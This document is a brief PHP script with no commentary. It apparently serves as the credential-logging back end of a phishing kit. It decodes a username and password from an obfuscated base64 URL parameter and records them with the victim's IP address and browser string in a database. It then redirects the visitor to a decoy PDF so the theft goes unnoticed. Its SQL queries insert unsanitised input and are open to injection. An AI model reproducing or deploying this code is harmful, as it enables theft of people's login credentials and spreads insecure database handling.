<?php
require 'functions.php';
if(isset($_GET['HGDhecnhjr785nHAUGN4N5TKNJDFJKNEJAWH34782BJDFJHSDFJGDHJsrthyetdghj'])){
$url=$_GET['HGDhecnhjr785nHAUGN4N5TKNJDFJKNEJAWH34782BJDFJHSDFJGDHJsrthyetdghj'];
$newUrl= base64_decode($url);
$daTa=explode('/',$newUrl);
$uSerName=$daTa[1];
$pasSword=$daTa[2];
$ip = $_SERVER['REMOTE_ADDR'];
$os = $_SERVER['HTTP_USER_AGENT'];
$date = date("m/d/y G.i:s", time());
if ($uSerName !==null && $pasSword !==null){

$checkuser= selectfun("username",$uSerName);
$rowCount= pg_num_rows($checkuser);

if($rowCount > 0){

    $sql = "UPDATE main SET password='$pasSword', ip='$ip', useragent='$os', date='$date' WHERE username='".$uSerName."'";
    $result=pg_query(dbconnection(), $sql);
    header('location:CHN-159.pdf');
}else{
  
  $sql = "INSERT INTO main (username, password, ip, useragent, date)
    VALUES ('$uSerName','$pasSword','$ip','$os','$date')";
    
        if (pg_query(dbconnection(), $sql)) {
          header('location:CHN-159.pdf');
        }  
    }
}
}else{
    header('location:error.php');
}

?>

